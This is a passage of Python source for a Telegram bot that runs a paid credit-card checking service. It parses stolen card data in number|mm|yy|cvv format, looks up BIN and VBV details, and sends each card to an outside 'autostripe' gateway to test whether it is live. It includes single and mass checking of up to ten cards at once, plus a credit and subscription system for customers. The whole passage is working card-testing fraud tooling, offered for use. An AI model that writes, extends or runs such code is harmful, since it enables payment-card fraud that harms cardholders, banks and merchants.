        return await update.effective_message.reply_text(escape_markdown_v2("❌ No valid cards were found in the file."), parse_mode=ParseMode.MARKDOWN_V2)

    # Format the output message with count and monospace
    cards_list = "\n".join([f"`{card}`" for card in found_cards])
    
    # Create the stylish box for the caption/message
    stylish_card_box = (
        f"💳 𝐂𝐀𝐑𝐃𝐕𝐀𝐔𝐋𝐓 𝐗 💳\n\n"
        f"╭━━━━━━━━━━━━━━━━━━⬣\n"
        f"┣ ❏ 𝐅𝐨𝐮𝐧𝐝 *{len(found_cards)}* 𝐂𝐚𝐫𝐝𝐬\n"
        f"╰━━━━━━━━━━━━━━━━━━⬣\n"
    )
    
    # Combine the box and the list of cards
    final_message = f"{stylish_card_box}\n{cards_list}"
    
    # Check if the message is too long to be sent normally
    # A safe limit, as Telegram's is 4096
    if len(final_message) > 4000:
        file_content = "\n".join(found_cards)
        file = io.BytesIO(file_content.encode('utf-8'))
        file.name = f"extracted_cards.txt"
        
        await update.effective_message.reply_document(
            document=file,
            caption=f"{stylish_card_box}",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    else:
        await update.effective_message.reply_text(
            final_message,
            parse_mode=ParseMode.MARKDOWN_V2
        )


import re
from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
import io
from telegram.helpers import escape_markdown as escape_markdown_v2

async def adcr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Adds a specified number of credits to a user's account, restricted to a specific owner."""
    # Owner ID is hardcoded
    OWNER_ID = 8438505794

    # Check if the user is the owner
    if update.effective_user.id != OWNER_ID:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ You are not allowed to use this command."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Check for correct number of arguments
    if len(context.args) != 2:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ Invalid command usage. Correct usage: /adcr [user_id] [no. of credits]"),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    try:
        user_id = int(context.args[0])
        credits_to_add = int(context.args[1])

        if credits_to_add <= 0:
            return await update.effective_message.reply_text(
                escape_markdown_v2("❌ The number of credits must be a positive integer."),
                parse_mode=ParseMode.MARKDOWN_V2
            )
    except ValueError:
        return await update.effective_message.reply_text(
            escape_markdown_v2("❌ Both the user ID and number of credits must be valid numbers."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Fetch the target user's data
    target_user_data = await get_user(user_id)

    if not target_user_data:
        return await update.effective_message.reply_text(
            escape_markdown_v2(f"❌ User with ID {user_id} not found in the database."),
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Update the user's credits
    new_credits = target_user_data.get('credits', 0) + credits_to_add
    await update_user(user_id, credits=new_credits)

    # Send a confirmation message with proper monospace formatting and escaping
    # The f-string is escaped here to handle the periods correctly.
    final_message = escape_markdown_v2(f"✅ Successfully added {credits_to_add} credits to user {user_id}. Their new credit balance is {new_credits}.")

    await update.effective_message.reply_text(
        final_message,
        parse_mode=ParseMode.MARKDOWN_V2
    )


from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Replace with your *legit* group/channel link
BULLET_GROUP_LINK = "https://t.me/+9IxcXQ2wO_c0OWQ1"

def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    import re
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))

async def bin_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Performs a BIN lookup and deducts 1 credit."""
    user = update.effective_user
    
    # Define the bullet point with the hyperlink
    bullet_link = f"\[[₰]({BULLET_GROUP_LINK})\]"

    # Get user data
    user_data = await get_user(user.id)
    if user_data['credits'] <= 0:
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Consume 1 credit
    if not await consume_credit(user.id):
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    bin_input = None
    if context.args:
        bin_input = context.args[0]
    elif update.effective_message and update.effective_message.text:
        command_text = update.effective_message.text.split(maxsplit=1)
        if len(command_text) > 1:
            bin_input = command_text[1]

    if not bin_input or not bin_input.isdigit() or len(bin_input) < 6:
        return await update.effective_message.reply_text(
            "❌ Please provide a 6\\-digit BIN\\. Usage: /bin [bin] or \\.bin [bin]\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Consume 1 credit
    # Note: This is a duplicate call, I've kept it as per your code structure. 
    # You may want to remove one of these `consume_credit` calls.
    if not await consume_credit(user.id):
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    bin_input = bin_input[:6]
    bin_details = await get_bin_details(bin_input)

    if not bin_details:
        return await update.effective_message.reply_text(
            "❌ BIN not found or invalid\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Escape and extract data safely
    escaped_bin = escape_markdown_v2(bin_input)
    escaped_scheme = escape_markdown_v2(bin_details.get("scheme", "N/A"))
    escaped_bank = escape_markdown_v2(bin_details.get("bank", "N/A"))
    escaped_card_type = escape_markdown_v2(bin_details.get("card_type", "N/A"))
    escaped_level = escape_markdown_v2(bin_details.get("level", "N/A"))
    escaped_country_name = escape_markdown_v2(bin_details.get("country_name", "N/A"))
    escaped_country_emoji = escape_markdown_v2(bin_details.get("country_emoji", ""))
    vbv_status = bin_details.get("vbv_status", "Unknown")
    escaped_user = escape_markdown_v2(user.full_name)

    # Custom emojis/status
    level_emoji = get_level_emoji(escaped_level)
    status_display = get_vbv_status_display(vbv_status)

    # BIN info box
    bin_info_box = (
        f"✦━━━[  *𝐁𝐈𝐍 𝐈𝐍𝐅𝐎* ]━━━✦\n"
        f"{bullet_link} *𝐁𝐈𝐍* ➳ `{escaped_bin}`\n"
        f"{bullet_link} *𝐒𝐭𝐚𝐭𝐮𝐬* ➳ `{escape_markdown_v2(status_display)}`\n"
        f"{bullet_link} *𝐁𝐫𝐚𝐧𝐝* ➳ `{escaped_scheme}`\n"
        f"{bullet_link} *𝐓𝐲𝐩𝐞* ➳ `{escaped_card_type}`\n"
        f"{bullet_link} *𝐋𝐞𝐯𝐞𝐥* ➳ `{level_emoji} {escaped_level}`\n"
        f"{bullet_link} *𝐁𝐚𝐧𝐤* ➳ `{escaped_bank}`\n"
        f"{bullet_link} *𝐂𝐨𝐮𝐧𝐭𝐫𝐲* ➳ `{escaped_country_name}{escaped_country_emoji}`\n"
        f"{bullet_link} *𝐑𝐞𝐪𝐮𝐞𝐬𝐭𝐞𝐝 𝐛𝐲* ➳ {escaped_user}\n"
        f"{bullet_link} *𝐁𝐨𝐭 𝐛𝐲* ➳ [kคli liຖนxx](tg://resolve?domain=K4linuxx)\n"
    )

    final_message = f"{bin_info_box}"

    await update.effective_message.reply_text(
        final_message,
        parse_mode=ParseMode.MARKDOWN_V2,
        disable_web_page_preview=True
    )



from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Replace with your *legit* group/channel link
BULLET_GROUP_LINK = "https://t.me/+9IxcXQ2wO_c0OWQ1"

def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    import re
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))

async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles the /credits command, showing user info and credits."""
    user = update.effective_user
    user_data = await get_user(user.id)
    
    # Define the bullet point with the hyperlink
    bullet_link = f"\[[₰]({BULLET_GROUP_LINK})\]"

    credits = str(user_data.get('credits', 0))
    plan = user_data.get('plan', 'N/A')

    # Escape user inputs
    escaped_username = escape_markdown_v2(user.username or 'N/A')
    escaped_user_id = escape_markdown_v2(str(user.id))
    escaped_plan = escape_markdown_v2(plan)
    escaped_credits = escape_markdown_v2(credits)

    credit_message = (
        f"💳 *Your Credit Info* 💳\n"
        f"✦━━━━━━━━━━━━━━✦\n"
        f"{bullet_link} Username: @{escaped_username}\n"
        f"{bullet_link} User ID: `{escaped_user_id}`\n"
        f"{bullet_link} Plan: `{escaped_plan}`\n"
        f"{bullet_link} Credits: `{escaped_credits}`\n"
    )

    await update.effective_message.reply_text(
        credit_message,
        parse_mode=ParseMode.MARKDOWN_V2,
        disable_web_page_preview=True
    )




import time
import asyncio
import aiohttp
from datetime import datetime
from telegram import Update
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown
from telegram.ext import ContextTypes
import re
import logging

# Import your database functions here
from db import get_user, update_user

logger = logging.getLogger(__name__)

# Global variable for user cooldowns
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
    """Enforces a cooldown period for a user to prevent spamming."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            escape_markdown(f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)} seconds.", version=2),
            parse_mode=ParseMode.MARKDOWN_V2
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False


# Replace with your *legit* group/channel link
BULLET_GROUP_LINK = "https://t.me/+9IxcXQ2wO_c0OWQ1"

def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))


# ✅ Async BIN Lookup (antipublic.cc)
async def get_bin_details(bin_number: str) -> dict:
    bin_data = {
        "scheme": "N/A",
        "type": "N/A",
        "level": "N/A",
        "bank": "N/A",
        "country_name": "N/A",
        "country_emoji": "",
        "vbv_status": None,
        "card_type": "N/A"
    }

    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    headers = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, timeout=7) as response:
                if response.status == 200:
                    try:
                        data = await response.json(content_type=None)

                        bin_data["scheme"] = str(data.get("brand", "N/A")).upper()
                        bin_data["type"] = str(data.get("type", "N/A")).title()
                        bin_data["card_type"] = str(data.get("type", "N/A")).title()
                        bin_data["level"] = str(data.get("level", "N/A")).title()
                        bin_data["bank"] = str(data.get("bank", "N/A")).title()
                        bin_data["country_name"] = data.get("country_name", "N/A")
                        bin_data["country_emoji"] = data.get("country_flag", "")
                        return bin_data
                    except Exception as e:
                        logger.warning(f"JSON parse error for BIN {bin_number}: {e}")
                else:
                    logger.warning(f"BIN API returned {response.status} for BIN {bin_number}")
    except Exception as e:
        logger.warning(f"BIN API call failed for {bin_number}: {e}")

    return bin_data



# ✅ Background check now uses live BIN data
async def background_check(cc_normalized, parts, user, user_data, processing_msg):
    bullet_link = f"\[[₰]({BULLET_GROUP_LINK})\]"
    
    try:
        bin_number = parts[0][:6]
        bin_details = await get_bin_details(bin_number)

        brand = (bin_details.get("scheme") or "N/A").upper()
        issuer = (bin_details.get("bank") or "N/A").title()
        country_name = (bin_details.get("country_name") or "N/A")
        country_flag = bin_details.get("country_emoji", "")

        # Your main API call
        api_url = f"https://kalinuxx.onrender.com/gateway=autostripe?key=k4linuxx&card={cc_normalized}"
        
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=45) as resp:
                if resp.status != 200:
                    raise Exception(f"HTTP {resp.status}")
                data = await resp.json()

        api_status = (data.get("status") or "Unknown").strip()

        # Status formatting
        status_text = api_status.upper()
        if "approved" in api_status.lower():
            status_text = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
        elif "declined" in api_status.lower():
            status_text = "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
        elif "ccn live" in api_status.lower():
            status_text = "𝗖𝗖𝗡 𝗟𝗜𝗩𝗘 ❎"
        
        header = f"═══\\[ **{escape_markdown_v2(status_text)}** \\]═══"

        formatted_response = api_status  # or api_response if you want the actual API message

        final_text = (
            f"{header}\n"
            f"{bullet_link} 𝐂𝐚𝐫𝐝 ➜ `{escape_markdown_v2(cc_normalized)}`\n"
            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜ 𝑺𝒕𝒓𝒊𝒑𝒆 𝑨𝒖𝒕𝒉\n"
            f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {formatted_response}\n"
            f"――――――――――――――――\n"
            f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➜ {escape_markdown_v2(brand)}\n"
            f"{bullet_link} 𝐁𝐚𝐧𝐤 ➜ {escape_markdown_v2(issuer)}\n"
            f"{bullet_link} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {escape_markdown_v2(country_name)} {country_flag}\n"
            f"――――――――――――――――\n"
            f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➜ {escape_markdown_v2(user.first_name)}\\[{escape_markdown_v2(user_data.get('plan', 'Free'))}\\]\n"
            f"{bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➜ [kคli liຖนxx](tg://resolve?domain=K4linuxx)\n"
            f"――――――――――――――――"
        )

        await processing_msg.edit_text(
            final_text,
            parse_mode=ParseMode.MARKDOWN_V2,
            disable_web_page_preview=True
        )

    except Exception as e:
        await processing_msg.edit_text(
            f"❌ API Error: {escape_markdown_v2(str(e))}",
            parse_mode=ParseMode.MARKDOWN_V2,
            disable_web_page_preview=True
        )





async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat = update.effective_chat
    user_id = user.id

    # Get user data
    user_data = await get_user(user_id)
    if not user_data:
        await update.effective_message.reply_text(
            "❌ Could not fetch your user data. Try again later.",
            parse_mode=None
        )
        return

    # Check credits
    if user_data.get("credits", 0) <= 0:
        await update.effective_message.reply_text(
            "❌ You have no credits left. Please buy a plan to get more credits.",
            parse_mode=None
        )
        return

    # Cooldown check
    if not await enforce_cooldown(user_id, update):
        return

    # Get card: reply or argument
    raw = None
    if update.message.reply_to_message and update.message.reply_to_message.text:
        raw = update.message.reply_to_message.text.strip()
    elif context.args:
        raw = ' '.join(context.args).strip()

    if not raw or "|" not in raw:
        await update.effective_message.reply_text(
            "Usage: reply to a message containing number|mm|yy|cvv or use /chk number|mm|yy|cvv",
            parse_mode=None
        )
        return

    parts = raw.split("|")
    if len(parts) != 4:
        await update.effective_message.reply_text(
            "Invalid format. Use number|mm|yy|cvv (or yyyy for year).",
            parse_mode=None
        )
        return

    # Normalize year
    if len(parts[2]) == 4:
        parts[2] = parts[2][-2:]
    cc_normalized = "|".join(parts)

    # Deduct credit
    if not await consume_credit(user_id):
        await update.effective_message.reply_text(
            "❌ No credits left.",
            parse_mode=None
        )
        return


    # Define bullet link
    bullet_link = f"\[[₰]({BULLET_GROUP_LINK})\]"

    # Processing message
    processing_text = (
        "═══\\[ 𝑷𝑹𝑶𝑪𝑬𝑺𝑺𝑰𝑵𝑮 \\]═══\n"
        f"{bullet_link} Card ➜ `{escape_markdown_v2(cc_normalized)}`\n"
        f"{bullet_link} Gateway ➜ 𝑺𝒕𝒓𝒊𝒑𝒆 𝑨𝒖𝒕𝒉\n"
        f"{bullet_link} Status ➜ Checking🔎\\.\\.\\.\n"
        "════════════════════"
    )

    # Send processing message (await inside async function)
    processing_msg = await update.effective_message.reply_text(
        processing_text,
        parse_mode=ParseMode.MARKDOWN_V2,
        disable_web_page_preview=True
    )

    # Start background task
    asyncio.create_task(background_check(cc_normalized, parts, user, user_data, processing_msg))



import asyncio
import time
import aiohttp
import re
from datetime import datetime

from telegram import Update
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown
from telegram.ext import ContextTypes

from db import get_user, update_user  # Your async DB functions here

OWNER_ID = 8438505794  # Replace with your Telegram user ID
user_cooldowns = {}

# Mapping to normalize stylish text (used for API responses like "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝")
STYLISH_MAP = {
    '𝐀': 'A','𝐁': 'B','𝐂': 'C','𝐃': 'D','𝐄': 'E','𝐅': 'F','𝐆': 'G','𝐇': 'H','𝐈': 'I','𝐉': 'J',
    '𝐊': 'K','𝐋': 'L','𝐌': 'M','𝐍': 'N','𝐎': 'O','𝐏': 'P','𝐐': 'Q','𝐑': 'R','𝐒': 'S','𝐓': 'T',
    '𝐔': 'U','𝐕': 'V','𝐖': 'W','𝐗': 'X','𝐘': 'Y','𝐙': 'Z',
    '𝐚': 'a','𝐛': 'b','𝐜': 'c','𝐝': 'd','𝐞': 'e','𝐟': 'f','𝐠': 'g','𝐡': 'h','𝐢': 'i','𝐣': 'j',
    '𝐤': 'k','𝐥': 'l','𝐦': 'm','𝐧': 'n','𝐨': 'o','𝐩': 'p','𝐪': 'q','𝐫': 'r','𝐬': 's','𝐭': 't',
    '𝐮': 'u','𝐯': 'v','𝐰': 'w','𝐱': 'x','𝐲': 'y','𝐳': 'z',
    '𝗔': 'A','𝗕': 'B','𝗖': 'C','𝗗': 'D','𝗘': 'E','𝗙': 'F','𝗚': 'G','𝗛': 'H','𝗜': 'I','𝗝': 'J',
    '𝗞': 'K','𝗟': 'L','𝗠': 'M','𝗡': 'N','𝗢': 'O','𝗣': 'P','𝗤': 'Q','𝗥': 'R','𝗦': 'S','𝗧': 'T',
    '𝗨': 'U','𝗩': 'V','𝗪': 'W','𝗫': 'X','𝗬': 'Y','𝗭': 'Z',
    '𝗮': 'a','𝗯': 'b','𝗰': 'c','𝗱': 'd','𝗲': 'e','𝗳': 'f','𝗴': 'g','𝗵': 'h','𝗶': 'i','𝗷': 'j',
    '𝗸': 'k','𝗹': 'l','𝗺': 'm','𝗻': 'n','𝗼': 'o','𝗽': 'p','𝗾': 'q','𝗿': 'r','𝘀': 's','𝘁': 't',
    '𝘂': 'u','𝘃': 'v','𝘄': 'w','𝘅': 'x','𝘆': 'y','𝘇': 'z',
    '𝟑': '3'
}

def normalize_text(text: str) -> str:
    """Replace stylish letters/numbers with normal ones."""
    return "".join(STYLISH_MAP.get(ch, ch) for ch in text)


# --- PLAN VALIDATION ---
async def has_active_paid_plan(user_id: int) -> bool:
    """
    Check if user has an active paid plan (not Free and not expired).
    Returns True if plan is active.
    """
    user_data = await get_user(user_id)
    if not user_data:
        return False

    plan = str(user_data.get("plan", "Free"))
    expiry = user_data.get("plan_expiry", "N/A")

    # Free plan is not valid
    if plan.lower() == "free":
        return False

    # Expiry check
    if expiry != "N/A":
        try:
            expiry_date = datetime.strptime(expiry, "%d-%m-%Y")
            if expiry_date < datetime.now():
                return False
        except Exception:
            return False

    return True


async def check_authorization(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """
    Private chats: only OWNER_ID or users with an active paid plan can use.
    Group chats: only OWNER_ID or users with an active paid plan can use.
    """
    user_id = update.effective_user.id
    chat_type = update.effective_chat.type

    # ✅ Owner bypass
    if user_id == OWNER_ID:
        return True

    # ✅ Both private & group require active paid plan
    if not await has_active_paid_plan(user_id):
        await update.effective_message.reply_text(
            "🚫 You need an *active paid plan* to use this command.\n"
            "💳 or use for free in our grorup."
        )
        return False

    return True


# --- COOLDOWN HANDLER ---
async def enforce_cooldown(user_id: int, update: Update, cooldown: int = 5) -> bool:
    """
    Enforces a per-user cooldown for commands.
    Returns True if user can proceed, False if still on cooldown.
    """
    now = time.time()
    last_time = user_cooldowns.get(user_id, 0)

    if now - last_time < cooldown:
        remaining = round(cooldown - (now - last_time), 2)
        await update.effective_message.reply_text(
            escape_markdown(f"⏳ Cooldown active. Wait {remaining} seconds.", version=2),
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        return False

    user_cooldowns[user_id] = now
    return True


# --- CREDITS HANDLER (optional, mostly for groups if you want per-use charging) ---
async def consume_credit(user_id: int) -> bool:
    """
    Consume 1 credit from the user's account.
    Returns True if successful, False if user has no credits.
    """
    try:
        user_data = await get_user(user_id)
        if user_data and user_data.get("credits", 0) > 0:
            new_credits = user_data["credits"] - 1
            await update_user(user_id, credits=new_credits)
            return True
    except Exception as e:
        print(f"[consume_credit] Error updating user {user_id}: {e}")

    return False




async def check_cards_background(cards_to_check, user_id, user_first_name, processing_msg, start_time):
    approved_count = declined_count = checked_count = error_count = 0
    results = []
    total_cards = len(cards_to_check)

    semaphore = asyncio.Semaphore(5)  # limit to 5 concurrent requests

    async def check_card(session, raw):
        nonlocal approved_count, declined_count, checked_count, error_count

        async with semaphore:  # acquire semaphore before running
            parts = raw.split("|")
            if len(parts) != 4:
                checked_count += 1
                error_count += 1
                return f"❌ Invalid card format: `{raw}`"

            # Normalize year (YYYY → YY)
            if len(parts[2]) == 4:
                parts[2] = parts[2][-2:]
            cc_normalized = "|".join(parts)

            api_url = f"https://kalinuxx.onrender.com/gateway=autostripe?key=k4linuxx&card={cc_normalized}"

            try:
                async with session.get(api_url, timeout=45) as resp:
                    if resp.status != 200:
                        raise Exception(f"HTTP {resp.status}")
                    try:
                        data = await resp.json()
                    except Exception as e:
                        raw_text = await resp.text()
                        print(f"[DEBUG] JSON decode failed for {cc_normalized}: {e}, raw={raw_text[:200]}...")
                        raise Exception(f"JSON decode failed: {e}")
            except Exception as e:
                checked_count += 1
                error_count += 1
                return f"❌ API Error for card `{cc_normalized}`: {escape_markdown(str(e) or 'Unknown', version=2)}"

            api_response = data.get("status", "Unknown")
            api_response_clean = normalize_text(
                re.sub(r'[\U00010000-\U0010ffff]', '', api_response).strip()
            )

            api_response_lower = api_response_clean.lower()
            if "approved" in api_response_lower:
                approved_count += 1
            elif "declined" in api_response_lower or "incorrect" in api_response_lower:
                declined_count += 1

            checked_count += 1

            return (
                f"`{cc_normalized}`\n"
                f"𝐒𝐭𝐚𝐭𝐮𝐬 ➳ {escape_markdown(api_response_clean, version=2)}"
            )

    async with aiohttp.ClientSession() as session:
        tasks = [check_card(session, raw) for raw in cards_to_check]
        update_interval = 3
        last_update = time.time()

        for coro in asyncio.as_completed(tasks):
            result = await coro
            results.append(result)

            if time.time() - last_update >= update_interval:
                last_update = time.time()
                current_summary = (
                    f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
                    f"✘ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣{checked_count}\n"
                    f"✘ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{approved_count}\n"
                    f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined_count}\n"
                    f"✘ 𝐄𝐫𝐫𝐨𝐫↣{error_count}\n"
                    f"✘ 𝐓𝐢𝐦𝐞↣{round(time.time() - start_time, 2)}s\n"
                    f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n"
                    f"──────── ⸙ ─────────"
                )
                try:
                    await processing_msg.edit_text(
                        escape_markdown(current_summary, version=2) + "\n\n" +
                        "\n──────── ⸙ ─────────\n".join(results),
                        parse_mode=ParseMode.MARKDOWN_V2
                    )
                except Exception:
                    pass

    # Final summary
    final_time_taken = round(time.time() - start_time, 2)
    final_summary = (
        f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
        f"✘ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣{checked_count}\n"
        f"✘ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{approved_count}\n"
        f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined_count}\n"
        f"✘ 𝐄𝐫𝐫𝐨𝐫↣{error_count}\n"
        f"✘ 𝐓𝐢𝐦𝐞↣{final_time_taken}s\n"
        f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n"
        f"──────── ⸙ ─────────"
    )
    await processing_msg.edit_text(
        escape_markdown(final_summary, version=2) + "\n\n" +
        "\n──────── ⸙ ─────────\n".join(results) +
        "\n──────── ⸙ ─────────",
        parse_mode=ParseMode.MARKDOWN_V2
    )




async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    chat_type = update.effective_chat.type

    # ✅ Private chat restriction
    if chat_type == "private":
        try:
            user_data = await get_user(user_id)
            plan = user_data.get("plan", "Free") if user_data else "Free"
            credits = user_data.get("credits", 0) if user_data else 0
        except Exception as e:
            print(f"[mchk_command] DB error for user {user_id}: {e}")
            await update.effective_message.reply_text(
                "❌ Error fetching your account info. Try again later."
            )
            return

        # Block if no active plan or no credits
        if plan.lower() == "free" or credits <= 0:
            await update.effective_message.reply_text(
                "🚫 You cannot use this command in private chat.\n"
                "👉 You need an active paid plan with credits.\n"
                "💳 or use for free in our group."
            )
            return

    else:
        # ✅ In groups — anyone can run, but still needs credits
        try:
            user_data = await get_user(user_id)
            credits = user_data.get("credits", 0) if user_data else 0
        except Exception as e:
            print(f"[mchk_command] DB error for user {user_id}: {e}")
            await update.effective_message.reply_text(
                "❌ Error fetching your account info. Try again later."
            )
            return

        if credits <= 0:
            await update.effective_message.reply_text(
                "❌ You have no credits left. Please buy a plan to get more credits."
            )
            return

    # ✅ enforce cooldown
    if not await enforce_cooldown(user_id, update):
        return

    # ✅ consume 1 credit
    if not await consume_credit(user_id):
        await update.effective_message.reply_text(
            "❌ You have no credits left. Please buy a plan to get more credits."
        )
        return

    # ✅ extract raw cards
    raw_cards = ""
    if context.args:
        raw_cards = " ".join(context.args)
    elif update.effective_message.reply_to_message and update.effective_message.reply_to_message.text:
        raw_cards = update.effective_message.reply_to_message.text

    if not raw_cards.strip():
        await update.effective_message.reply_text("⚠️ Usage: /mchk number|mm|yy|cvv")
        return

    # ✅ card regex
    card_pattern = re.compile(r"(\d{13,16}\|\d{1,2}\|(?:\d{2}|\d{4})\|\d{3,4})")
    card_lines = card_pattern.findall(raw_cards)

    if not card_lines:
        await update.effective_message.reply_text(
            "⚠️ Please provide at least one card in the format: number|mm|yy|cvv."
        )
        return

    # ✅ limit 10
    cards_to_check = card_lines[:10]
    if len(card_lines) > 10:
        await update.effective_message.reply_text(
            "⚠️ Only 10 cards are allowed. Checking the first 10 now."
        )

    # ✅ initial processing message
    processing_msg = await update.effective_message.reply_text("🔎𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜...")
    start_time = time.time()

    # ✅ run background task
    task = asyncio.create_task(
        check_cards_background(cards_to_check, user_id, user.first_name, processing_msg, start_time),
        name="card_checker"
    )

    task.add_done_callback(
        lambda t: t.exception() and print(f"[mchk] Background error: {t.exception()}")
    )




import asyncio
import time
from datetime import datetime
from telegram import Update
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown
from telegram.ext import ContextTypes
from db import get_user, update_user  # your DB functions

OWNER_ID = 8438505794  # Replace with your Telegram ID
AUTHORIZED_CHATS = set()  # Put your authorized chat IDs here
user_cooldowns = {}


# --- Utility functions ---
async def enforce_cooldown(user_id: int, update: Update, cooldown: int = 5) -> bool:
    """
    Enforce per-user cooldown for commands.
    Returns True if user can proceed.
    """
    now = time.time()
    last = user_cooldowns.get(user_id, 0)

    if now - last < cooldown:
        remaining = round(cooldown - (now - last), 2)
        await update.effective_message.reply_text(
            escape_markdown(f"⏳ Cooldown active. Wait {remaining} seconds.", version=2),
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        return False

    user_cooldowns[user_id] = now
    return True


async def consume_credit(user_id: int) -> bool:
    """Deduct 1 credit if available. Return True if successful."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False


async def has_active_paid_plan(user_id: int) -> bool:
    """
    Check if user has an active paid plan (not Free and not expired).
    Returns True if plan is active.
    """
    user_data = await get_user(user_id)
    if not user_data:
        return False

    plan = str(user_data.get("plan", "Free"))
    expiry = user_data.get("plan_expiry", "N/A")

    # Free plan is not valid
    if plan.lower() == "free":
        return False

    # Expiry check (treat expiry as valid until end of that day)
    if expiry != "N/A":
        try:
            expiry_date = datetime.strptime(expiry, "%d-%m-%Y").replace(
                hour=23, minute=59, second=59
            )
            if expiry_date < datetime.now():
                return False
        except Exception:
            return False

    return True


async def check_authorization(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """
    Private chats: only OWNER_ID or users with an active paid plan can use.
    Authorized chats (groups/channels): free for everyone.
    Other groups: only OWNER_ID or users with an active paid plan can use.
    """
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    chat_type = update.effective_chat.type

    # ✅ Owner bypass
    if user_id == OWNER_ID:
        return True

    # ✅ Free access in authorized chats
    if chat_id in AUTHORIZED_CHATS:
        return True

    # ✅ Everywhere else requires active paid plan
    if not await has_active_paid_plan(user_id):
        await update.effective_message.reply_text(
            escape_markdown(
                "🚫 You need an *active paid plan* to use this command.\n"
                "💳 Or use for free in our authorized group.",
                version=2,
            ),
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        return False

    return True



# --- Background card checking ---
def normalize_status_string(status):
    """
    Converts stylized status strings to a standard ASCII format for consistent counting.
    """
    character_map = {
        '𝐀':'A','𝐁':'B','𝐂':'C','𝐃':'D','𝐄':'E','𝐅':'F','𝐆':'G','𝐇':'H','𝐈':'I','𝐉':'J',
        '𝐊':'K','𝐋':'L','𝐌':'M','𝐍':'N','𝐎':'O','𝐏':'P','𝐐':'Q','𝐑':'R','𝐒':'S','𝐓':'T',
        '𝐔':'U','𝐕':'V','𝐖':'W','𝐗':'X','𝐘':'Y','𝐙':'Z',
